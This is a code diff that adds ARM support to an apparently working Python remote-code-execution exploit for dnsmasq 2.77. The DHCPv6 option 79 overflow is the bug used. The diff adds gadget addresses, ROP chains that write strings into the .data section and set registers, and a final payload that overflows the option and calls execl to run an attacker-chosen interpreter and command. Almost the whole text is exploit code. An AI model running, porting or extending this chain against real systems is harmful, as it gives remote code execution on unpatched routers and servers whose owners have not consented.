@@ -49,14 +49,16 @@ tm = ThreadManager(3)
 # NOP
 NOP = {
     "i386": 0x90909090, 
-    "amd64": 0x9090909090909090
+    "amd64": 0x9090909090909090,
+    "arm": 0x90909090
 }
 
 
 # CRASH
 CRASH = {
     "i386": 0x41414141,
-    "amd64": 0x4141414141414141
+    "amd64": 0x4141414141414141,
+    "arm": 0x41414141
 }
 
 
@@ -75,6 +77,13 @@ JUNK = {
         "2.75": 32,
         "2.74": 32,
         "2.73": 32
+    },
+    "arm": {
+        "2.77": 24,
+        "2.76": 24,
+        "2.75": 24,
+        "2.74": 24,
+        "2.73": 24
     }
 }
 
@@ -91,6 +100,9 @@ TEXT = {
     "amd64": {
         "2.77": 0x0000000000402e00,
         "2.76": 0x0000000000402d30
+    },
+    "arm": {
+        "2.77": 0x00012088
     }
 }
 
@@ -107,6 +119,9 @@ DATA = {
     "amd64": {
         "2.77": 0x000000000064a480,
         "2.76": 0x0000000000648460
+    },
+    "arm": {
+        "2.77": 0x0005e238
     }
 }
 
@@ -123,6 +138,9 @@ EXECL = {
     "amd64": {
         "2.77": 0x0000000000427b30,
         "2.76": 0x0000000000426a36
+    },
+    "arm": {
+        "2.77": 0x00035254
     }
 }
 
@@ -186,6 +204,18 @@ ROP = {
             "cmp": 0x0000000000430c71,      # cmp eax, 0x219212 ; ret
             "mov": 0x00000000004324f9       # mov qword ptr [rsi + 0x70], rdi ; ret
         }
+    },
+    "arm": {
+        "2.77": {
+            "pop r1": 0x00046370,  # pop {r1, pc}
+            "pop r3": 0x000119f8,  # pop {r3, pc}
+            "pop r4": 0x0001599c,  # pop {r4, pc}
+            "pop r5": 0x0001caec,  # pop {r4, r5, pc}
+            "pop r6": 0x000121bc,  # pop {r4, r5, r6, pc}
+            "ldr r0": 0x00043d80,  # ldr r0, [r3, #0x90] ; pop {r4, pc}
+            "ldr r2": 0x00039168,  # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
+            "str": 0x0003478c      # str r3, [r4] ; pop {r4, pc}
+         }
     }
 }
 
@@ -264,10 +294,10 @@ host = str(args.target)
 port = int(args.target_port)
 
 architecture = ""
-if args.architecture == "i386" or args.architecture == "amd64":
+if args.architecture == "i386" or args.architecture == "amd64" or args.architecture == "arm":
     architecture = args.architecture
 else:
-    print Base.c_error + "Bad architecture: " + args.architecture + " allow only i386 or amd64!"
+    print Base.c_error + "Bad architecture: " + args.architecture + ". Allow only arm, i386 or amd64!"
     exit(1)
 
 dnsmasq_version = ""
@@ -440,7 +470,7 @@ def add_string_in_data(addr_in_data, string):
     v = dnsmasq_version
     rop_chain = ""
 
-    if architecture == "i386":
+    if architecture == "i386" or architecture == "arm":
         if len(string) % 4 == 0:
             string = string + "\x00" * 4
         else:
@@ -484,10 +514,21 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += string[x:x + 8]                       # 8 byte of string
                 rop_chain += Base.pack64(ROP[a][v]["mov"])         # mov qword ptr [rsi + 0x70], rdi ; ret
 
+    if architecture == "arm":
+
+        if dnsmasq_version == "2.77":
+            for x in range(0, len(string), 4):
+                rop_chain += Base.pack32(ROP[a][v]["pop r3"])  # pop {r3, pc}
+                rop_chain += string[x:x + 4]                   # r3 = 4 byte of string
+                rop_chain += Base.pack32(ROP[a][v]["pop r4"])  # pop {r4, pc}
+                rop_chain += Base.pack32(addr_in_data + x)     # r4 = address in .data
+                rop_chain += Base.pack32(ROP[a][v]["str"])     # str r3, [r4] ; pop {r4, pc}
+                rop_chain += Base.pack32(NOP[architecture])    # NOP (0x90909090) in r4
+
     return rop_chain
 
 
-def register_management(architecture, dnsmasq_version, register_name, register_value):
+def register_management(architecture, dnsmasq_version, register_name, register_value, register_address=0):
     result = ""
     v = dnsmasq_version
     r = register_name
@@ -537,6 +578,60 @@ def register_management(architecture, dnsmasq_version, register_name, register_v
                 result += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
 
         return result
+
+    elif architecture == "arm":
+        if r == "r0":
+            if v == "2.77":
+                result += register_management(architecture, dnsmasq_version, "r3", register_value)
+                result += register_management(architecture, dnsmasq_version, "r4", register_address)
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
+                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
+                result += register_management(architecture, dnsmasq_version, "r3", register_address - 0x90)
+
+                # # ldr r0, [r3, #0x90] ; pop {r4, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["ldr r0"])
+                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
+
+        if r == "r2":
+            if v == "2.77":
+                result += register_management(architecture, dnsmasq_version, "r3", register_value)
+                result += register_management(architecture, dnsmasq_version, "r4", register_address)
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["str"])
+                result += Base.pack32(register_address)    # r4 = 0x90909090
+
+                result += register_management(architecture, dnsmasq_version, "r5", register_address)
+                result += register_management(architecture, dnsmasq_version, "r4", register_address)
+
+                # ldr r2, [r5] ; ldr r3, [r4, #4] ; cmp r2, r3 ; beq #0x39194 ; mov r0, #0 ; pop {r4, r5, r6, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["ldr r2"])
+                result += Base.pack32(NOP[architecture])    # r4 = 0x90909090
+                result += Base.pack32(NOP[architecture])    # r5 = 0x90909090
+                result += Base.pack32(NOP[architecture])    # r6 = 0x90909090
+
+        if r == "r1" or r == "r3" or r == "r4":
+            if v == "2.77":
+                # <register_name> = register_value
+                # pop {<register_name>, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop " + register_name])
+                result += Base.pack32(register_value)
+
+        if r == "r5":
+            if v == "2.77":
+                # pop {r4, r5, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r5"])
+                result += Base.pack32(register_address)   # r4 = <register_address>
+                result += Base.pack32(register_value)     # r5 = <register_value>
+
+        if r == "r6":
+            if v == "2.77":
+                # # pop {r4, r5, r6, pc}
+                result += Base.pack32(ROP[architecture][dnsmasq_version]["pop r6"])
+                result += Base.pack32(register_address)   # r4 = <register_address>
+                result += Base.pack32(register_address)   # r5 = <register_address>
+                result += Base.pack32(register_value)     # r6 = <register_value>
+
+        return result
+
     else:
         return result
 
@@ -696,6 +791,47 @@ def exploit():
         # EAX = 0x0
         # call EXECL
         option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl
+
+    elif architecture == "arm":
+
+        interpreter_addr = DATA[architecture][dnsmasq_version]
+        interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
+        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4
+
+        # print "Interpreter address: " + str(hex(interpreter_addr))
+        # print "Interpreter argument address: " + str(hex(interpreter_arg_addr))
+        # print "Payload address: " + str(hex(payload_addr))
+
+        option_79 += Base.pack16(0)  # mac_type
+
+        option_79 += "A" * JUNK[architecture][dnsmasq_version]
+
+        option_79 += Base.pack32(0x00000000)  # R4 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R5 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R6 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R7 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R8 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R9 = 0x00000000
+        option_79 += Base.pack32(0x00000000)  # R10 = 0x00000000
+
+        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
+        option_79 += add_string_in_data(interpreter_addr, interpreter)
+        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
+        option_79 += add_string_in_data(payload_addr, payload)
+
+        option_79 += register_management(architecture, dnsmasq_version, "r2", interpreter_arg_addr,
+                                         payload_addr + len(payload) + (4 - (len(payload) % 4)) + 4)
+
+        option_79 += register_management(architecture, dnsmasq_version, "r0", interpreter_addr,
+                                         payload_addr + len(payload) + (4 - (len(payload) % 4)) + 4)
+
+        option_79 += register_management(architecture, dnsmasq_version, "r1", interpreter_addr)
+        option_79 += register_management(architecture, dnsmasq_version, "r3", payload_addr)
+        option_79 += register_management(architecture, dnsmasq_version, "r6", 0x00000000)
+
+        # option_79 += Base.pack32(CRASH[architecture])  # crash for debug
+        option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
+        option_79 += Base.pack32(0x00000000)
 
     else:
         print Base.c_error + "This architecture: " + architecture + " not yet supported!"
